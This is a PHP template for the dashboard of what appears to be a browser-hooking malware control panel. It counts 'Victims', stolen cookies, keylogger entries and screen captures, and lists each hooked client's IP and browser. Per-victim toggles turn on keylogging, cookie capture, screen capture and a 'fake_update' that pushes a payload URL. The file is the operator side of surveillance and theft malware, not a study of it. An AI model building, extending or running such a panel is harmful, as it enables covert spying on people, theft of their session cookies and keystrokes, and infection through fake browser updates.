
<div class="row">

            <div class="col-md-3 col-sm-6 col-xs-12">
              <div class="info-box">
                <span class="info-box-icon bg-red"><i class="fa  fa-user-secret"></i></span>
                <div class="info-box-content">
                  <span class="info-box-text">Victims</span>
                  <span class="info-box-number"><?=$data["clientsCount"] ?></span>
                </div><!-- /.info-box-content -->
              </div><!-- /.info-box -->
            </div><!-- /.col -->

            <div class="col-md-3 col-sm-6 col-xs-12">
              <div class="info-box">
                <span class="info-box-icon bg-aqua"><i class="fa fa-asterisk"></i></span>
                <div class="info-box-content">
                  <span class="info-box-text">Cookies</span>
                  <span class="info-box-number"><?=$data["cookies"] ?></span>
                </div><!-- /.info-box-content -->
              </div><!-- /.info-box -->
            </div><!-- /.col -->
            <div class="col-md-3 col-sm-6 col-xs-12">
              <div class="info-box">
                <span class="info-box-icon bg-green"><i class="fa fa-keyboard-o"></i></span>
                <div class="info-box-content">
                  <span class="info-box-text">Keylogger</span>
                  <span class="info-box-number"><?=$data["keylogger"] ?></span>
                </div><!-- /.info-box-content -->
              </div><!-- /.info-box -->
            </div><!-- /.col -->
            <div class="col-md-3 col-sm-6 col-xs-12">
              <div class="info-box">
                <span class="info-box-icon bg-navy"><i class="fa fa-camera-retro"></i></span>
                <div class="info-box-content">
                  <span class="info-box-text">Screen Captures</span>
                  <span class="info-box-number"><?=$data["screens"] ?></span>
                </div><!-- /.info-box-content -->
              </div><!-- /.info-box -->
            </div><!-- /.col -->
          </div>

<? if(!empty($data["clients"])) { ?>
          <div class="row">

            <div class="col-xs-12">


              <div class="box">
                <div class="box-header">
                  <h3 class="box-title">Victims List</h3>
                </div><!-- /.box-header -->
                <div class="box-body no-padding">
                  <table class="table table-striped">
                    <tbody><tr>
                      <th>IP</th>
                      <th>Platform</th>
                      <th>Browser</th>
                      <th>Browser Ver.</th>
                      <th>Keylogger</th>
                      <th>Cookie Capture</th>
                      <th>Browser Update</th>
                      <th>Screen Capture</th>
                      <th>Started Monitoring</th>
                      <th>Edit</th>
                    </tr>
                    <? foreach ($data["clients"] as $key => $value) { ?>
                    <tr>
                      <td><a href="timeline.php?cid=<?=$value["client_id"] ?>&page=1"><p class="text-red"><b><?=$value["ip"] ?></b></p></a></td>
                      <td><?=$value["platform"] ?></td>
                      <td><?=$value["browser"] ?></td>
                      <td><?=$value["browser_ver"] ?></td>
                      <?=html_option($value["client_id"], "keylogger", $value["keylogger"]) ?>
                      <?=html_option($value["client_id"], "cookies", $value["cookies"]) ?>
                      <? if(empty($value["payload_url"])) echo html_option($value["client_id"], "no_payload", "Payload URL not set"); else echo html_option($value["client_id"], "fake_update", $value["fake_update"]); ?>
                      <?=html_option($value["client_id"], "screen_capture", $value["screen_capture"],$value["scr_cap_interval"]) ?>
                      <td><?=time_elapsed_string($value["first_added"]) ?></td>
                      <td><a href="settings.php?cid=<?=$value["client_id"] ?>"><p class="text-purple"><b>Settings</b></p></a></td>
                    </tr>
                    <?
                    }
                    ?>    
                  </tbody></table>
                </div><!-- /.box-body -->
              </div><!-- /.box -->
            </div><!-- /.col -->
          </div><!-- /.row -->
<? } else { ?>
No Clients.
<? } ?>